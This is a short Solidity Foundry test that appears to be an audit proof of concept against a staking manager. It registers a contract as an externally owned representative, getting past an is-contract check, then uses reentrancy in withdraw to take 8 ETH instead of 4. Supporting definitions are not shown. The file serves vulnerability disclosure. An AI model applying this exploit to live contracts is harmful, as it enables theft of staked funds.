pragma solidity 0.8.13;

import "forge-std/Test.sol";


contract TestContract is Test{

function testBypassIsContractCheck_POC() public {

	NonEOARepresentative pass = new NonEOARepresentative{value: 8 ether}(address(manager));
	address wallet = manager.smartWalletOfNodeRunner(address(pass));
	address reprenstative = manager.smartWalletRepresentative(wallet);
	console.log("smart contract registered as a EOA representative");
	console.log(address(reprenstative) == address(pass));

	// to set the public key state to IDataStructures.LifecycleStatus.INITIALS_REGISTERED
	MockAccountManager(factory.accountMan()).setLifecycleStatus("publicKeys1", 1);

	// expected to withdraw 4 ETHER, but reentrancy allows withdrawing 8 ETHER
	pass.withdraw("publicKeys1");
	console.log("balance after the withdraw, expected 4 ETH, but has 8 ETH");
	console.log(address(pass).balance);
}
}
